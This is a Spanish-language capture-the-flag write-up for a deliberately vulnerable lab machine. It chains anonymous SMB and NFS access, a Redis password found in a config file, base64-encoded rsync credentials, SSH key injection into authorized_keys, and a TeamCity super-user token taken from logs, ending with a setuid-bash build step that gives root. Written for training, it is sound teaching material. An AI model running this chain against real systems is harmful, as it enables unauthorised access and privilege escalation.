# <font color=red>[+]</font> Reconocimiento

```bash
sudo nmap -p- -Pn -n -vvv -sS -oG initial_scan.gnmap $IP

PORT   STATE SERVICE
22/tcp    open     ssh          syn-ack ttl 62
111/tcp   open     rpcbind      syn-ack ttl 62
139/tcp   open     netbios-ssn  syn-ack ttl 62
445/tcp   open     microsoft-ds syn-ack ttl 62
873/tcp   open     rsync        syn-ack ttl 62
2049/tcp  open     nfs          syn-ack ttl 62
6379/tcp  open     redis        syn-ack ttl 62
9090/tcp  filtered zeus-admin   no-response
33969/tcp open     unknown      syn-ack ttl 62
41537/tcp open     unknown      syn-ack ttl 62
42031/tcp open     unknown      syn-ack ttl 62
44209/tcp open     unknown      syn-ack ttl 62
```

Hemos especificado la flag `-oG` para que nos prepare la salida en un formato con el cual podamos sacar los puertos abiertos de la siguiente forma:
```bash
ports=$(grep "Ports:" initial_scan.gnmap | cut -d: -f3 | tr ',' '\n' | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')
```

Ahora podemos realizar un segundo escaneo con `nmap` sin tener que ir especificando los puertos uno a uno, simplemente le pasamos la variable `$ports` que hemos definido con la expresión anterior.

```bash
sudo namp -p$ports -sVC -Pn -n -v -oN versiones.nmap $IP

PORT      STATE SERVICE VERSION
22/tcp    open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c5:aa:2c:7b:09:5a:98:3d:02:28:3d:a8:c7:35:ba:f7 (RSA)
|   256 6f:80:04:0c:c1:e9:00:fd:86:20:4e:1f:57:c7:31:6b (ECDSA)
|_  256 c8:cd:69:bf:90:c3:e1:c7:d2:c0:61:62:35:8c:54:e8 (ED25519)
111/tcp   open     rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      40917/udp6  mountd
|   100005  1,2,3      42031/tcp   mountd
|   100005  1,2,3      44982/udp   mountd
|   100005  1,2,3      55709/tcp6  mountd
|   100021  1,3,4      40131/tcp6  nlockmgr
|   100021  1,3,4      41537/tcp   nlockmgr
|   100021  1,3,4      45740/udp   nlockmgr
|   100021  1,3,4      57854/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open     netbios-ssn Samba smbd 4
445/tcp   open     netbios-ssn Samba smbd 4
873/tcp   open     rsync       (protocol version 31)
2049/tcp  open     nfs         3-4 (RPC #100003)
6379/tcp  open     redis       Redis key-value store
9090/tcp  filtered zeus-admin
33969/tcp open     mountd      1-3 (RPC #100005)
37981/tcp open     java-rmi    Java RMI
41537/tcp open     nlockmgr    1-4 (RPC #100021)
42031/tcp open     mountd      1-3 (RPC #100005)
44209/tcp open     mountd      1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-03-20T10:35:06
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   <00>                 Flags: <unique><active>
|   <03>                 Flags: <unique><active>
|   <20>                 Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
```
## SMB/SAMBA

Lo primero que me llama la atención es que los puertos `139` y `445` están abiertos corriendo el servicio ***SAMBA***.

Primero tratamos de realizar una conexión simple con `nxc` para ver que información nos da:
```bash
nxc smb $IP

SMB         10.129.151.221  445    IP-10-129-151-221 [*] Unix - Samba (name:IP-10-129-151-221) (domain:eu-west-3.compute.internal) (signing:False) (SMBv1:None) (Null Auth:True)
```

Podemos ver el ***hostname*** de la máquina (`IP-10-129-151-221`), su ***dominio*** (`eu-west-3.compute.internal`), no se requiere firma (`signing:False`), no está habilitado la versión  1 de SMB y podemos realizar una ***autenticación nula*** (`Null Auth: True`).

Vamos a realizar la conexión sin credenciales:
```bash
# Comprobamos que realmente podemos conectarnos sin credenciales
nxc smb $IP -u '' -p ''

SMB         10.129.151.221  445    IP-10-129-151-221 [+] eu-west-3.compute.internal\:

# Listamos los recursos compartidos para las conexiones nulas
nxc smb $IP -u '' -p '' --shares
 
SMB         10.129.151.221  445    IP-10-129-151-221 [*] Enumerated shares
SMB         10.129.151.221  445    IP-10-129-151-221 Share           Permissions     Remark
SMB         10.129.151.221  445    IP-10-129-151-221 -----           -----------     ------
SMB         10.129.151.221  445    IP-10-129-151-221 print$                          Printer Drivers
SMB         10.129.151.221  445    IP-10-129-151-221 shares          READ            VulnNet Business Shares
SMB         10.129.151.221  445    IP-10-129-151-221 IPC$                            IPC Service (ip-10-129-151-221 server (Samba, Ubuntu))
```

Tenemos permiso de lectura sobre el recurso compartido `shares`. Listamos su contendido con `smbclient`:
```bash
smbclient //$IP/shares -N
```

Encontramos dos directorios:
- `temp`
  |_ `services.txt`
- `data`
  |_ `data.txt`
  |_ `business-req.txt`

Podemos obtener la primera *flag* del CTF `services.txt`.

Sin embargo, no hay nada más de interés en el resto de archivos.
## rpcbind

El siguiente servicio que me llama la atención es `rpcbind` corriendo sobre el ***puerto 111***.

>[!note]
>***rpcbind*** es el servidor encargado de gestionar el mapeo entre los números de programa de ***RPC (Remote Procedure Call)*** y las direcciones de red (puertos) en las que estos escuchan.

Vemos que el escaneo de versiones y scripts por defecto de `nmap` nos ha sacado los servicios que corren usando ***RPC***, entre los que destacan `nfs` y `mountd`.
### NFS

>[!note]
>**NFS** o **Network File System** es un protocolo de sistema de archivos distribuido que permite a computadoras en una misma red acceder a archivos y directorios remotos como si estuvieran almacenados en su propio disco local.
#### mountd

>[!note]
>***mountd*** (`rpc.mountd`) es el demonio encargado de procesar las solicitudes de montaje de sistemas de archivos en un Servidor ***NFS***.

Según mi reporte de `nmap`, `mountd` corre en el puerto `42031/tcp` y `44982/udp` (*puede cambiar*).

Primero, enumeremos las carpetas compartidas mediante ***NFS*** usando `showmount`:
```bash
showmount -e $IP

Export list for 10.129.169.246:
/opt/conf *
```

Vemos que el servidor ***NFS*** está compartiendo el directorio `/opt/conf` con todas las direcciones IP, por lo que podemos tratar de montarlo en nuestro propio sistema para ver que contiene.

```bash
# Creamos un directorio en /mnt donde montaremos el recurso compartido
mkdir -p test_nfs

# Montamos el recurso
sudo mount -t nfs $IP:/opt/conf /mnt/test_nfs -o nolock
# -o nolock evita problemas con el gestor de bloqueos de archivos (NFS Lock Manager)
```

Cuando listamos su contenido encontramos varios directorios de los cuales destacan tres: `redis`, `init`, `opt`.

```bash
ls -la redis init opt

redis:
|_ redis.conf

init:
|_ anacron.conf
|_ lightdm.conf
|_ whoopside.conf

opt:
Nada
```

Tras investigar cada fichero, lo más interesante se encuentra dentro del archivo `redis.conf`.
### Redis

>[!note]
>***Redis (Remote Dictionary Server)*** es un motor de almacenamiento de datos en memoria de código abierto, utilizado principalmente como base de datos de *clave-valor*, caché y gestor de mensajes.

En el archivo de configuración `redis.conf`, la directiva `requirepass` es el mecanismo principal de autenticación básica del servidor.

```bash
grep -i "requirepass" redis/redis.conf

requirepass [hidden]
```

Hemos encontrado la contraseña del servicio ***Redis*** por lo que trataremos de conectarnos a él.

```bash
redis-cli -h $IP -a '<contraseña_redis'

10.129.169.246:6379
```

Si vemos el *prompt* de ***Redis*** significará que estamos dentro.

Lo primero que debemos hacer es visualizar información de Redis con el comando `info`, donde podremos ver que existen ***5 llaves*** en la base de datos `db0`. Para ver que contienen:
```
10.129.169.246:6379> keys *
1) "authlist"
2) "internal flag"
3) "int"
4) "marketlist"
5) "tmp"

# Para ir viendo el contenido de cada una
10.129.169.246:6379> get "internal flag"
"THM{[hidden]}"

10.129.169.246:6379> get authlist
(error) WRONGTYPE Operation against a key holding the wrong kind of value
# Si nos sale este error significa que la llave es de tipo "hash" o "list"

# Para saber su tipo
10.129.169.246:6379> type authlist
list

# Al ser de tipo lista podemos usar
10.129.169.246:6379> LRANGE authlist 0 -1
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
4) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
# Se nos devuelve varias veces un mismo código en base 64
```

Para decodificar los códigos en base 64 abrimos una nueva ventana de terminal y usamos el comando:
```bash
echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==" | base64 -d

Authorization for rsync://rsync-connect@127.0.0.1 with password [hidden]
```

Acabamos de obtener las credenciales de acceso al servicio ***rsync***.
### rsync

>[!note]
>***rsync (Remote Sync)*** es una utilidad de línea de comandos extremadamente versátil y eficiente diseñada para sincronizar y transferir archivos o directorios tanto localmente como entre sistemas remotos.

En el contexto de la ciberseguridad, ***rsync*** es una herramienta que si no está bien configurada puede permitir leer o escribir archivos en el servidor con los privilegios del servicio.

Si usamos el comando `rsync --list-only rsync-connect@$IP::`, se nos mostrará la existencia de un módulo `files`.  para explotarlo debemos usar:
```bash
rsync --list-only rsync-connect@$IP::files

Password: 
drwxr-xr-x          4,096 2026/03/20 12:20:27 .
drwxr-xr-x          4,096 2025/06/28 18:16:36 ssm-user
drwxr-xr-x          4,096 2021/02/06 13:49:29 sys-internal
drwxr-xr-x          4,096 2026/03/20 12:20:27 ubuntu
```

Encontramos lo que parece ser el directorio `/home/` del servidor.

Tratamos de listar el contenido de los directorios, pero el único que contiene cosas interesantes es `sys-internal/` el cual contiene mucho contenido.
```bash
rsync --list-only rsync-connect@$IP::files/sys-internal/ -a

<snip>
.ssh
<snip>
```

### SSH Key Injection
>[!warning]
>1. Creamos un ***par de claves ssh***:
>   ```bash
>ssh-key -t rsa -f ./id_rsa_vulnnet -N ""
>   ```
> 2. Inyectamos la clave ssh pública que acabamos de crear en el archivo `.ssh/authorized_keys` 
>    ```bash
>    rsync -av id_rsa_vulnnet.pub rsync-connect@$IP::files/sys-internal/.ssh/authorized_keys
>    ```
> 3. Cambiamos los permisos de `id_rsa_vulnnet`:
>    ```bash
>    chmod 600 id_rsa_vulnnet
>    ```
> 4. Nos conectamos vía ***ssh*** al servidor:
>    ```bash
>    ssh sys-internal@$IP -i id_rsa_vulnnet
>    ```

---
# <font color=red>[+]</font> Post-Explotación

Una vez dentro del sistema como el usuario `sys-internal`, podemos acceder al archivo `user.txt`.
## Escalada de privilegios

Tras investigar las principales formas de escalada de privilegios no encuentro ninguna forma satisfactorio de conseguir realizar una escalada de privilegios vertical.

No obstante, dentro del directorio raíz (`/`) encuentro un directorio que llama mi atención (`TeamCity`).
### TeamCity

>[!note]
>***TeamCity*** es un servidor de **Integración y Despliegue Continuo (CI/CD)** desarrollado por JetBrains que automatiza el ciclo de vida de una aplicación, desde la compilación del código hasta su puesta en producción.
>
>Tras su instalación, la interfaz web de *TeamCity* es accesible a través de un navegador web, cuya dirección por defecto son: `http://localhost/` para *Windows* y `http://localhost:8111/` para la distribución `tar.gz`.

Si tratamos de conectarnos directamente a través de un navegador a la dirección `http://$IP:8111/` no tendremos acceso ya que, si revisamos de nuevo el escaneo de `nmap` sobre los puertos abiertos `8111` no es accesible desde nuestra situación.

Para arreglar esto, y aprovechando que tenemos acceso al sistema vía SSH, podemos crear un ***túnel SSH*** para que podamos ejecutar el servicio como si estuviéramos accediendo desde la máquina víctima. 

```bash
ssh -L 8111:127.0.0.1:8111 -i id_rsa_vulnnet sys-internal@$IP
```

Ahora, si podremos acceder al servicio desde el navegador web de nuestra propia máquina atacante navegando a la dirección `http:://127.0.0.1:8111/`.
#### Web UI

Al acceder a la interfaz web de ***TeamCity*** encontramos un panel de login en las que deberemos de introducir unas credenciales las cuales no tenemos. Sin embargo, también existe una funcionalidad para entrar como usuario `Super user` en la cual debemos de introducir un token de autenticación.

Si investigamos el directorio `/TeamCity/` del sistema de archivos encontraremos un directorio llamado `logs`, en el cual si entramos encontramos varios ficheros de logs. Alguno de estos ficheros podría contener información útil por lo que trato de filtrar por la palabra *token* en todos los ficheros:
```bash
grep -i token *

catalina.out:[TeamCity] Super user authentication token: 6027884085891035972 (use empty username with the token as the password to access the server)
```

>[!note]
>Tal vez muestre varios tokens, supongo que será debido a que el token es temporal así que usando el último debería de funcionar.

>[!warning]
>Para explotar el servicio y escalar privilegios:
>1. ***Creamos un nuevo proyecto***:
>   Lo creamos de forma manual, dándole un nombre. 
>2. Le damos a *Create Build Configuration*:
>   Creamos las configuraciones de forma manual tambien, volviendo a darle un nombre.
>3. Skipeamos la siguiente sección.
>4. ***Creamos un Step***
>   Definimos en el *Run type* -> ***Command Line***
>   Le damos un nombre y especificamos el comando a ejecutar: `chmod +s /bin/bash`
>5. Le damos a ejecutar arriba a la derecha.
>6. En la terminal ejecutamos el comando:
>   ```bash
>   /bin/bash -p
>   
>   whoami
>   # root
>   ```
